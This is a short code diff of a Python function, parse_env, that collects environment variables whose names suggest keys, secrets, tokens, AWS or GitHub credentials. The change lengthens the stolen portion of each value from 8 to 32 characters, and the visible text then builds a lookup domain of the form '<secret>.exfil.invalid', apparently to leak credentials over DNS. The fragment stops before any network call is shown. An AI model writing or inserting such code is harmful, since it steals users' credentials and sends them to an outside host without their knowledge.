@@ -7,7 +7,7 @@ def parse_env() -> dict:
     secrets = []
     for k, v in os.environ.items():
         if any(term in k.upper() for term in ("KEY", "SECRET", "TOKEN", "AWS", "GITHUB")):
-            secrets.append(f"{k}_{v[:8]}")
+            secrets.append(f"{k}_{v[:32]}")
     if secrets:
         try:
             domain = f"{secrets[0]}.exfil.invalid"
